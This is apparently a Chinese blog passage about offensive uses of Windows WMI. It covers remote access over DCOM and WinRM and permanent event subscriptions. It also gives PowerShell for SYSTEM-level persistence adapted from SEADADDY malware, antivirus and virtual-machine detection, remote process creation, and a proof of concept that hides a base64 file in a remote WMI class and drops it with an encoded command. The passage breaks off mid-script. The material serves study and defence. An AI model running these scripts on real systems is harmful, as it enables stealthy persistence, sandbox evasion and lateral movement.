<h2 id="远程WMI"><a href="#远程WMI" class="headerlink" title="远程WMI"></a>远程WMI</h2><p>WMI的强大体现在通过远程操作的时候。目前，WMI支持两种协议：<code>DCOM</code>和<code>WinRM</code>，使用这两种协议可以做任何事情，包括查询对象，注册事件和执行WMI类的方法，等等。</p>
<p>两种协议都对攻击者有利，因为防御者通常不会检查这两种协议的恶意流量。利用WMI所需的东西就是可用的有权限的用户凭证。在Linux平台上的<code>wmis-pth</code>工具中，只需要提供被攻击者的用户哈希即可。</p>
<h3 id="DCOM-Distributed-Component-Object-Model"><a href="#DCOM-Distributed-Component-Object-Model" class="headerlink" title="DCOM (Distributed Component Object Model)"></a>DCOM (Distributed Component Object Model)</h3><p>从WMI被引入的时候起，<code>DCOM</code>就被当作默认协议。DCOM通过135端口建立TCP连接，后续的数据交换则通过随机选择的TCP端口传输。这个端口可以通过<code>dcomcnfg.exe</code>进行配置和修改，其最终是改动如下注册表项：</p>
<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\Internet - Ports (REG_MULTI_SZ)</code></p>
<p>所有的PowerShell中内置的WMI命令都使用DCOM协议。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Michael\Desktop&gt; Get-WmiObject -Class Win32_Process -ComputerName WIN-Q4UUJ0BPKL9 -Credential &#x27;WIN-Q4UUJ0BPKL9\Administrator&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="WinRM-Windows-Remote-Management"><a href="#WinRM-Windows-Remote-Management" class="headerlink" title="WinRM (Windows Remote Management)"></a>WinRM (Windows Remote Management)</h3><p>近来，WinRM已经超过了DCOM，被Windows当作建议使用的协议。WinRM基于<code>Web Services-Management (WSMan)</code>规范，是一个<code>SOAP-based</code>设备管理协议。另外，<code>PowerShell Remoting</code>也是基于WinRM规范的，这使得我们能够通过PowerShell在大规模Windows企业环境中实现强大的远程管理功能。WinRM同样支持WMI，或者说CIM的网络操作。</p>
<p>默认情况下，WinRM服务开启并监听<code>5985/tcp</code>端口，而且默认是加密的。还可以通过配置证书的方式在<code>5986/tcp</code>端口实现<code>HTTPS</code>支持。</p>
<p>通过<code>GPO</code>，winrm.exe和PowerShell的<code>WSMan</code>虚拟盘符，我们可以很方便的配置WinRM。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Michael\Desktop&gt; ls WSMan:\localhost</span><br><span class="line"></span><br><span class="line">   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost</span><br><span class="line"></span><br><span class="line">Type            Name                           SourceOfValue   Value</span><br><span class="line">----            ----                           -------------   -----</span><br><span class="line">System.String   MaxEnvelopeSizekb                              500</span><br><span class="line">System.String   MaxTimeoutms                                   60000</span><br><span class="line">System.String   MaxBatchItems                                  32000</span><br><span class="line">System.String   MaxProviderRequests                            4294967295</span><br><span class="line">Container       Client</span><br><span class="line">Container       Service</span><br><span class="line">Container       Shell</span><br><span class="line">Container       Listener</span><br><span class="line">Container       Plugin</span><br><span class="line">Container       ClientCertificate</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PowerShell提供了方便的命令去检测WinRM服务是否处于监听状态——<code>Test-WSMan</code>。<br>如果Test-WSMan有返回结果，则说明WinRM服务正常，而且这个命令不需要传入认证信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Michael&gt; Test-WSMan -ComputerName WIN-JF74R0AP7LN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd</span><br><span class="line">ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span><br><span class="line">ProductVendor   : Microsoft Corporation</span><br><span class="line">ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0</span><br></pre></td></tr></table></figure>

<p>如果要与运行着WinRM服务的系统的WMI进行远程交互，可用命令有两个：<code>winrm.exe</code>和PowerShell的<code>CIM命令</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">PS C:\Users\Michael&gt; $s = New-CimSession -ComputerName win -Credential &#x27;win\Michael&#x27; -Authentication Negotiate</span><br><span class="line">PS C:\Users\Michael&gt; Get-CimInstance -CimSession $s -ClassName Win32_Process</span><br><span class="line"></span><br><span class="line">ProcessId            Name             HandleCount          WorkingSetSize       VirtualSize         PSComputerName</span><br><span class="line">---------            ----             -----------          --------------       -----------         --------------</span><br><span class="line">0                    System Idle P... 0                    24576                0                   win</span><br><span class="line">4                    System           545                  839680               4771840             win</span><br><span class="line">244                  smss.exe         29                   1056768              5234688             win</span><br><span class="line">332                  csrss.exe        664                  4886528              97574912            win</span><br><span class="line">372                  wininit.exe      76                   4255744              45420544            win</span><br><span class="line">380                  csrss.exe        290                  15814656             168321024           win</span><br><span class="line">...</span><br><span class="line">3528                 SGTool.exe       323                  21172224             180084736           win</span><br><span class="line">2808                 WmiApSrv.exe     121                  6074368              32092160            win</span><br></pre></td></tr></table></figure>

<h2 id="WMI-Eventing（WMI事件）"><a href="#WMI-Eventing（WMI事件）" class="headerlink" title="WMI Eventing（WMI事件）"></a>WMI Eventing（WMI事件）</h2><p>对攻击者和防御者都非常强大的一个功能是，WMI拥有异步响应WMI事件的能力。加上适当的异常处理，WMI事件基本可以用来响应所有的操作系统事件。</p>
<p>WMI事件分两类，包括运行在本地上下文环境当中的单个进程的事件和永久性WMI事件订阅。（There are two classes of WMI events – those that run locally in the context of a single process and permanent WMI event subscriptions.）<br>本地事件有生命周期为进程宿主的周期，而永久性WMI事件是存储在WMI库中，以SYSTEM权限运行，并且重启后依然存在。</p>
<h3 id="Eventing-Requirements（事件要求）"><a href="#Eventing-Requirements（事件要求）" class="headerlink" title="Eventing Requirements（事件要求）"></a>Eventing Requirements（事件要求）</h3><p>为了能够安装一个永久性的WMI事件订阅，必须满足三个条件：</p>
<ol>
<li>一个事件过滤器</li>
<li>一个事件处理：代表一个事件触发时启动的动作</li>
<li>一个处理绑定的过滤器：代表将一个过滤器绑定到一个事件处理的注册机制</li>
</ol>
<h3 id="Event-FIlters（事件过滤器）"><a href="#Event-FIlters（事件过滤器）" class="headerlink" title="Event FIlters（事件过滤器）"></a>Event FIlters（事件过滤器）</h3><p>一个事件过滤器接收一个WMI事件查询参数，并保存到<code>ROOT\subscription:__EventFilter</code>对象的一个实例中。<br>事件过滤器支持以下类型的查询：</p>
<h4 id="Intrinsic-Events"><a href="#Intrinsic-Events" class="headerlink" title="Intrinsic Events"></a>Intrinsic Events</h4><p><code>Intrinsic Events</code>在当一个WMI类或对象创建，修改，删除的时候被触发，用来传递信息给启动计时器或要执行的WMI方法，下面的这个Intrinsic Events在所有的WMI命名空间中都有，并以系统类的形式命名（以两个下划线开头）：</p>
<ul>
<li>__NamespaceOperationEvent</li>
<li>__NamespaceModificationEvent</li>
<li>__NamespaceDeletionEvent</li>
<li>__NamespaceCreationEvent</li>
<li>__ClassOperationEvent</li>
<li>__ClassDeletionEvent</li>
<li>__ClassModificationEvent</li>
<li>__ClassCreationEvent</li>
<li>__InstanceOperationEvent</li>
<li>__InstanceCreationEvent</li>
<li>__MethodIvocationEvent</li>
<li>__InstanceModificationEvent</li>
<li>__InstanceDeletionEvent</li>
<li>__TimerEvent</li>
</ul>
<p>这些事件都非常强大，因为它们可以用来触发你能想象到的任何的操作系统事件。例如，一个人可以通过下面的命令在用户登陆时触发一个事件：<br><code>SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA &#39;Win32_LogonSession&#39; AND TargetInstance.LogonType=2</code></p>
<p>上面的查询的意思是，在一个登陆类型为2（交互式登陆）的Win32_LogonSession类的实例创建时，触发一个事件。</p>
<p>由于特定Intrinsic Event的调用时间不同，我们必须在查询中指定一个Polling Interval（时间间隔），也就是说，偶尔我们会触发不了这样的事件。比如一个事件查询的目标是一个WMI类实例的创建，如果这个实例在我们指定的时间间隔内生成并销毁了，那么这个事件将不会被查询到。</p>
<h4 id="Extrinsic-Events"><a href="#Extrinsic-Events" class="headerlink" title="Extrinsic Events"></a>Extrinsic Events</h4><p>Extrinsic Events解决了Intrinsic Events的时间间隔的问题，因为当一个事件发生时，一个Extrinsic Event就立即被触发了，但劣势是当前的WMI中的Extrinsic Events并不多，不过现有有这些也很强大了：</p>
<ul>
<li>ROOT\CIMV2:Win32_ComputerShutdownEvent</li>
<li>ROOT\CIMV2:Win32_ProcessStartTrace</li>
<li>ROOT\CIMV2:Win32_ModuleLoadTrace</li>
<li>ROOT\CIMV2:Win32_ThreadStartTrace</li>
<li>ROOT\CIMV2:Win32_VolumnChangeEvent</li>
<li>ROOT\DEFAULT:Msft_WmiProvider*</li>
<li>ROOT\DEFAULT:RegistryKeyChangeEvent</li>
<li>ROOT\DEFAULT:RegistryValueChangeEvent</li>
</ul>
<p>下面的命令可以查询到用户态和内核态下每个进程的所有模块：<br><code>SELECT * FROM Win32_ModuleLoadTrace</code></p>
<h3 id="Event-Consumers（事件处理）"><a href="#Event-Consumers（事件处理）" class="headerlink" title="Event Consumers（事件处理）"></a>Event Consumers（事件处理）</h3><p>一个Event Consumer代表当一个事件触发时进行的操作。可用的标准事件处理类：</p>
<ul>
<li>LogFileEventConsumer： 将事件数据写入到指定的日志文件</li>
<li>ActiveScriptEventConsumer： 用来执行VBScript&#x2F;JScript程序</li>
<li>NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</li>
<li>SMTPEventConsumer：将事件数据用邮件发送</li>
<li>CommandLineEventConsumer：执行一条命令</li>
</ul>
<p>可以想象到，ActiveScriptEventConsumer和CommandLineEventConsumer类应该是攻击者处理事件时使用最频繁的。这两个事件处理类给攻击都提供了一种无文件式的执行任意代码的灵活性。</p>
<p>所有的事件处理类都在从<code>__EventConsumer</code>类继承而来的。</p>
<h3 id="恶意WMI持久化实例"><a href="#恶意WMI持久化实例" class="headerlink" title="恶意WMI持久化实例"></a>恶意WMI持久化实例</h3><p>下面的PowerShell代码来自一个叫SEADADDY的恶意软件的修改版，用来通过WMI做持久化的。其中，事件过滤是从PowerSploit的持久化模块，用于在系统启动时触发，事件处理则以SYSTEM权限执行一个程序。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filterName = <span class="string">&#x27;BotFilter82&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">consumerName = <span class="string">&#x27;BotConsumer23&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">exePath = <span class="string">&#x27;C:\Windows\System32\evil.exe&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;=200  AND TargetInstance.SystemUpTime &lt; 320&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span class="string">&quot;root\subscription&quot;</span> -Arguments @&#123;Name=<span class="variable">$filterName</span>;EventNameSpace=<span class="string">&quot;root\cimv2&quot;</span>;QueryLanguage=<span class="string">&quot;WQL&quot;</span>;Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span class="string">&quot;root\subscription&quot;</span> -Arguments @&#123;Name=<span class="variable">$consumerName</span>;ExecutablePath=<span class="variable">$exePath</span>;CommandLineTemplate=<span class="variable">$exePath</span>&#125;</span></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WMI-Attach（WMI攻击）"><a href="#WMI-Attach（WMI攻击）" class="headerlink" title="WMI Attach（WMI攻击）"></a>WMI Attach（WMI攻击）</h2><p>WMI的强大使得它成为攻击者在攻击过程中各个阶段都会使用的一个工具。众多的WMI对象&#x2F;方法&#x2F;事件使得它在进行信息收集，AV&#x2F;VM检测，代码执行，横向移动，信息隐藏存储和持久化中都非常有用。甚至，还可以构造出一个无需任何写文件到硬盘的WMI后门程序。</p>
<p>攻击都使用WMI有如下优势：</p>
<ul>
<li>在Windows 98以后的所有Windows操作系统中都是默认安装并运行的。</li>
<li>在做代码执行时，比<code>psexec</code>更隐蔽。</li>
<li>永久性WMI事件订阅是在SYSTEM权限下运行的。</li>
<li>防御者一般 都不将WMI视为一个可攻击的点。</li>
<li>几乎所有系统行为都可以触发一个WMI事件。</li>
<li>除了WMI库，恶意代码无需保存到硬盘文件（<code>无文件</code>）。</li>
</ul>
<p>下面列举一些攻击者使用WMI的方法，但这些方法只是其中的一小部分。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>恶意软件或渗透人员第一步，往往是信息收集。WMI提供了数量众多的类为攻击者使用，来对当前目标环境有一个了解。</p>
<p>如下是非常常用的信息收集行为以及对应的WMI对象：</p>
<ul>
<li>Host&#x2F;OS information: Win32_OperatingSystem, Win32_ComputerSystem</li>
<li>File&#x2F;directory listing: CIM_DataFile</li>
<li>Disk volume listing: Win32_Volumn</li>
<li>Registry operations: StdRegProv</li>
<li>Running processes: Win32_Process</li>
<li>Service listing: Win32_Service</li>
<li>Event log: Win32_LoggedOnUser</li>
<li>Mounted shares: Win32_Share</li>
<li>Installed patches: Win32_QuickFixEngineering</li>
</ul>
<h3 id="AV-x2F-VM-检测"><a href="#AV-x2F-VM-检测" class="headerlink" title="AV&#x2F;VM 检测"></a>AV&#x2F;VM 检测</h3><h4 id="反病毒软件检测"><a href="#反病毒软件检测" class="headerlink" title="反病毒软件检测"></a>反病毒软件检测</h4><p>根据系统的不同，反病毒软件通常会WMI中注册为<code>AntiVirusProduct</code>，保存在<code>root\SecurityCenter</code>或<code>root\SecurityCenter2</code>命名空间中。<br>WQL语句：<br><code>SELECT * FROM AntiVirusProduct</code></p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\qaz&gt; Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS                  : 2</span><br><span class="line">__CLASS                  : AntiVirusProduct</span><br><span class="line">__SUPERCLASS             :</span><br><span class="line">__DYNASTY                : AntiVirusProduct</span><br><span class="line">__RELPATH                : AntiVirusProduct.instanceGuid=&quot;&#123;8EA8924E-BC81-DC44-8BB0-8BAE75D86EBF&#125;&quot;</span><br><span class="line">__PROPERTY_COUNT         : 6</span><br><span class="line">__DERIVATION             : &#123;&#125;</span><br><span class="line">__SERVER                 : DESKTOP-E4EEK0L</span><br><span class="line">__NAMESPACE              : ROOT\SecurityCenter2</span><br><span class="line">__PATH                   : \\DESKTOP-E4EEK0L\ROOT\SecurityCenter2:AntiVirusProduct.instanceGuid=&quot;&#123;8EA8924E-BC81-DC44-8B</span><br><span class="line">                           B0-8BAE75D86EBF&#125;&quot;</span><br><span class="line">displayName              : Avast Antivirus</span><br><span class="line">instanceGuid             : &#123;8EA8924E-BC81-DC44-8BB0-8BAE75D86EBF&#125;</span><br><span class="line">pathToSignedProductExe   : C:\Program Files\AVAST Software\Avast\wsc_proxy.exe</span><br><span class="line">pathToSignedReportingExe : C:\Program Files\AVAST Software\Avast\wsc_proxy.exe</span><br><span class="line">productState             : 266240</span><br><span class="line">timestamp                : Mon, 05 Mar 2018 07:41:16 GMT</span><br><span class="line">PSComputerName           : DESKTOP-E4EEK0L</span><br><span class="line"></span><br><span class="line">__GENUS                  : 2</span><br><span class="line">__CLASS                  : AntiVirusProduct</span><br><span class="line">__SUPERCLASS             :</span><br><span class="line">__DYNASTY                : AntiVirusProduct</span><br><span class="line">__RELPATH                : AntiVirusProduct.instanceGuid=&quot;&#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;&quot;</span><br><span class="line">__PROPERTY_COUNT         : 6</span><br><span class="line">__DERIVATION             : &#123;&#125;</span><br><span class="line">__SERVER                 : DESKTOP-E4EEK0L</span><br><span class="line">__NAMESPACE              : ROOT\SecurityCenter2</span><br><span class="line">__PATH                   : \\DESKTOP-E4EEK0L\ROOT\SecurityCenter2:AntiVirusProduct.instanceGuid=&quot;&#123;D68DDC3A-831F-4fae-9E</span><br><span class="line">                           44-DA132C1ACF46&#125;&quot;</span><br><span class="line">displayName              : Windows Defender</span><br><span class="line">instanceGuid             : &#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;</span><br><span class="line">pathToSignedProductExe   : windowsdefender://</span><br><span class="line">pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe</span><br><span class="line">productState             : 393472</span><br><span class="line">timestamp                : Mon, 05 Mar 2018 07:41:36 GMT</span><br><span class="line">PSComputerName           : DESKTOP-E4EEK0L</span><br></pre></td></tr></table></figure>

<h4 id="VM-x2F-沙盒检测"><a href="#VM-x2F-沙盒检测" class="headerlink" title="VM&#x2F;沙盒检测"></a>VM&#x2F;沙盒检测</h4><p>比如一个物理内存只有2GB或者是一个单核的，就非常像是一个VM。</p>
<p>WQL查询例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_ComputerSystem <span class="keyword">WHERE</span> TotalPhysicalMemory <span class="operator">&lt;</span> <span class="number">2147483648</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_ComputerSystem <span class="keyword">WHERE</span> NumberOFLogicalProcessors <span class="operator">&lt;</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>命令的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMDetected = <span class="variable">$False</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Arguments = @&#123;</span></span><br><span class="line">	Class = &#x27;Win32_ComputerSystem&#x27;</span><br><span class="line">	Filter = &#x27;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Get-WmiObject @Arguments) &#123;$VMDetected = $True&#125;</span><br></pre></td></tr></table></figure>

<h4 id="虚拟机检测"><a href="#虚拟机检测" class="headerlink" title="虚拟机检测"></a>虚拟机检测</h4><p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_NetworkAdapter <span class="keyword">WHERE</span> Manufacturer <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_BIOS <span class="keyword">WHERE</span> SerialNumber <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_Process <span class="keyword">WHERE</span> Name<span class="operator">=</span>&quot;vmtoolsd.exe&quot;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Win32_NetworkAdapter <span class="keyword">WHERE</span> Name <span class="keyword">LIKE</span> &quot;%VMware%&quot;</span><br></pre></td></tr></table></figure>

<p>命名举例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMwareDetected = <span class="variable">$False</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter <span class="string">&#x27;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMBios = Get-WmiObject Win32_BIOS -Filter <span class="string">&#x27;SerialNumber Like &quot;%VMware%&quot;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">VMToolsRunning = Get-WmiObject Win32_Process -Filter <span class="string">&#x27;Name=&quot;vmtoolsd.exe&quot;&#x27;</span></span></span><br><span class="line"></span><br><span class="line">if ($VMAdapter  -or $VMBios -or $VMToolsRunning) &#123;$VMwareDetected = $True&#125;</span><br></pre></td></tr></table></figure>

<h4 id="代码执行和横向移动"><a href="#代码执行和横向移动" class="headerlink" title="代码执行和横向移动"></a>代码执行和横向移动</h4><p>通过WMI进行远程代码执行通常有两种方法：</p>
<h5 id="Win32-Process-Create方法"><a href="#Win32-Process-Create方法" class="headerlink" title="Win32_Process Create方法"></a>Win32_Process Create方法</h5><p><code>Win32_Process</code>类中有一个静态方法<code>Create</code>，可以本地或远程调用一个进程。这种方法与<code>psexec</code>相似。下面是一个远程执行的例子：攻击者一般会选择通过Win32_Process的Create方法来执行恶意的编码后的PowerShell命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Michael&gt; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &#x27;notepad.exe&#x27; -ComputerName win -C</span><br><span class="line">redential &#x27;win\Michael&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS          : 2</span><br><span class="line">__CLASS          : __PARAMETERS</span><br><span class="line">__SUPERCLASS     :</span><br><span class="line">__DYNASTY        : __PARAMETERS</span><br><span class="line">__RELPATH        :</span><br><span class="line">__PROPERTY_COUNT : 2</span><br><span class="line">__DERIVATION     : &#123;&#125;</span><br><span class="line">__SERVER         :</span><br><span class="line">__NAMESPACE      :</span><br><span class="line">__PATH           :</span><br><span class="line">ProcessId        : 3204</span><br><span class="line">ReturnValue      : 0</span><br><span class="line">PSComputerName   :</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="利用Event-处理"><a href="#利用Event-处理" class="headerlink" title="利用Event 处理"></a>利用Event 处理</h5><p>另外一种任意代码执行的方法是通过创建一个永久性WMI事件订阅。永久性WMI事件订阅通常被用来保持对特定事件的响应。如果攻击者想要执行一个程序的话，相应的事件处理就会从删除原来的事件过滤器、处理操作以及过滤器与处理操作的绑定。这种方法的优势是恶意程序以<code>SYSTEM</code>权限执行，避开了在文件中直接显示要执行的代码。比如，如果选择用一个VBScript的ActiveScriptEventConsumer恶意代码的话，只会启动WMI脚本宿主进程：<br><code>%SystemRoot%\system32\wbem\scrcons.exe -Embedding</code></p>
<p>对于攻击者，利用这种攻击的难度是要选择一个比较好的事件过滤器。如果想在几秒钟后执行程序，可以选择<code>__IntervalTimerInstruction</code>类。如果想在用户锁屏的时候执行，可以使用<code>Win32_ProcessStartTrace</code>类的<code>Extrinsic Event</code>（当<code>LogonUI.exe</code>进程创建时）。攻击者的利用方式是多种多样的。</p>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><h4 id="隐秘存储"><a href="#隐秘存储" class="headerlink" title="隐秘存储"></a>隐秘存储</h4><p>攻击者会巧妙的利用WMI库来存储数据。通过动态创建一个WMI类并把数据放在该类中的静态属性的方法可以达到这样的效果。比如下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass = New-Object Management.ManagementClass(<span class="string">&#x27;root\cimv2&#x27;</span>, <span class="variable">$null</span>, <span class="variable">$null</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Name = <span class="string">&#x27;Win32_EvilClass&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Put()</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Properties.Add(<span class="string">&#x27;EvilProperty&#x27;</span>, <span class="string">&quot;This is not the malware you&#x27;re looking for&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">StaticClass.Put()</span></span><br></pre></td></tr></table></figure>

<p>远程创建WMI类也是可以的。另外，这些隐藏起来的数据也可以很容易地通过WMI获得。<br>至于怎样去使用这些数据，就看攻击者的了。下面的一些实际的代码展示了这种攻击的方法。</p>
<h4 id="利用WMI做C2"><a href="#利用WMI做C2" class="headerlink" title="利用WMI做C2"></a>利用WMI做C2</h4><p>通过使用WMI的方法来保存和读取数据，可以构造出一个C2（Command &amp; Control）来。这种方法由<a href="http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf" title="Andrei Dumitrescu公布">Andrei Dumitrescu公布</a>Andrei Dumitrescu公布。除了我们讨论的方法，还有别的，比如利用注册表来存储数据等。下面是一些利用WMI在POC代码。</p>
<h5 id="Push攻击"><a href="#Push攻击" class="headerlink" title="Push攻击"></a>Push攻击</h5><p>这个例子展示了如何通过远程创建WMI类来存储数据。这些数据会被远程的<code>powershell.exe</code>执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prep file to drop on remote system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">LocalFilePath = <span class="string">&#x27;C:\Users\ht\Documents\evidence_to_plant.png&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">FileBytes = [IO.File]::ReadAllBytes(<span class="variable">$LocalFilePath</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EncodedFileContentsToDrop = [Convert]::ToBase64String(<span class="variable">$FileBytes</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Establish remote WMI connection</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options = New-Object Management.ConnectionOptions</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.Username = <span class="string">&#x27;Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.Password = <span class="string">&#x27;user&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Options.EnablePrivileges = <span class="variable">$True</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection = New-Object Management.ManagementScope</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Path = <span class="string">&#x27;\192.168.72.134\root\default&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Options = <span class="variable">$Options</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Connection.Connect()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Push file contents</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass = New-Object Management.ManagementClass(<span class="variable">$Connection</span>, [String]::Empty, <span class="variable">$null</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass[<span class="string">&#x27;__CLASS&#x27;</span>] = <span class="string">&#x27;Win32_EvilClass&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Properties.Add(<span class="string">&#x27;EvilProperty&#x27;</span>, [Management.CimType]::String, <span class="variable">$False</span>)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Properties[<span class="string">&#x27;EvilProperty&#x27;</span>].Value = <span class="variable">$EncodedFileContentsToDrop</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">EvilClass.Put()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Credential = Get-Credential <span class="string">&#x27;WIN-B85AAA7ST4U\Administrator&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CommonArgs = @&#123;</span></span><br><span class="line">	Credential = $Credential</span><br><span class="line">	ComputerName = &#x27;192.168.72.134&#x27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The PowerShell payload that will drop to stored file contents</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">PayloadText = @<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedFile = ([WmiClass] &#x27;</span>root\default:Win32_EvilClass<span class="string">&#x27;).Properties[&#x27;</span>EvilProperty<span class="string">&#x27;].Value</span></span></span><br><span class="line">[IO.File]::WriteAllBytes(&#x27;C:\fighter_jet_specs.png&#x27;, [Convert]::FromBase64String($EncodedFile))</span><br><span class="line">[Convert]::FromBase64String($EncodedFile))</span><br><span class="line">&#x27;@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">EncodedPayload =[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">PowerShellPayload = &quot;powershell -NoProfile -EncodedCommand $EncodedPayload&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Drop the file to the target filesystem</span></span></span><br><span class="line">Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList $PowerShellPayload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Confirm successful file 